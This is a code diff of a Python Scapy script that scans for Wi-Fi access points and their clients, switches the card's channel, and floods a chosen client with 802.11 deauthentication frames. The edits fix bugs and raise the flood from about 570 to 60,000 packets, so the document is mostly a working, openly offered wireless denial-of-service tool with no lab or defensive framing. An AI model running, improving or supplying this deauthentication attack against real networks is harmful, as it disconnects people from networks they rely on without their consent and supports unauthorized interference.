@@ -9,11 +9,11 @@ interface = "" # indentfied Network Card
 AP_target = []
 
 # APs
-AP_dict = {} #founded AP
+AP_dict = {} #founded AP , {key - index, value=list[addr2=mac_ap , addr3=? , info=name(ssid) , channel=channel_of_ap]}
 index_AP_target = 0
 
 #clients
-station_dict = {}
+station_dict = {} # {key - index ,value - mac_client}
 index_client_target = 0
 
 
@@ -53,7 +53,7 @@ def packetHandler(packet):
             
             ap_point_list = []
             ap_point_list.append(packet.addr2) # BSSID
-            ap_point_list.append(packet.addr3) 
+            ap_point_list.append(packet.addr3)
             ap_point_list.append(packet.info) #append SSID
             ap_point_list.append(channel)
             AP_dict[index_AP_target] = ap_point_list
@@ -83,15 +83,14 @@ def packetUsers(packet):
 
     if packet.addr1 != "ff:ff:ff:ff:ff:ff" and (packet.addr2 == BSSID_target or packet.addr3 == BSSID_target):
                 if packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3:
-                    for i in station_dict:
-                        key_list = station_dict.get(i)
-                        if packet.addr1 in key_list:
-                            flag = True
-                            break
+                    for x in station_dict.values():
+                         if packet.addr1 == x:
+                             flag = True
+                             break
+
                     if flag == False:
-                        clients_list = []
-                        clients_list.append(packet.addr1) 
-                        station_dict[index_client_target] = clients_list
+
+                        station_dict[index_client_target] = packet.addr1
                             
                         print("index: ", index_client_target, "    addr1(src): ", packet.addr1, "   addr2(dest): ", packet.addr2,  "    addr3(?): ", packet.addr3)
                         index_client_target = index_client_target + 1
@@ -133,19 +132,24 @@ def changeChannelToAP(index : int) -> None:
     global interface
     global AP_dict
     AP_details = AP_dict.get(index)
-    channel_target = AP_details[2] #get the channel
+    channel_target = AP_details[3] #get the channel
     channel_target_converted = str(channel_target)
     os.system("sudo iwconfig " + interface + " channel " + channel_target_converted)
 
-def deauth(client_index) -> None:
-
+def deauth(client_index:int) -> None:
+    global interface
+    global station_dict
+    global AP_target
     print("client_index: ", client_index)
+    print("client mac: ", station_dict.get(client_index))
     print("addr2: ", AP_target[0])
     print("addr3: ", AP_target[1])
 
-    for y in range(1, 20): 
+    for y in range(2000): 
         pkt = RadioTap()/Dot11(addr1=station_dict.get(client_index), addr2=AP_target[0], addr3=AP_target[1])/Dot11Deauth()
-        sendp(pkt, iface=interface, count=30, inter = .001) 
+        sendp(pkt, iface=interface, count=30, inter = .001)
+
+
 
 def main():
     os.system("iwconfig") #to see our interfaces we have
@@ -199,8 +203,8 @@ def main():
         print("did not find any client")
         sys.exit() # end script
 
-    client_index = input("----- Choose client to attack -----")
-    deauth(client_index)
+    client_index = input("Choose client to attack: ")
+    deauth(int(client_index))
 
     changeToManagedMode(interface) # change back to default mode
 
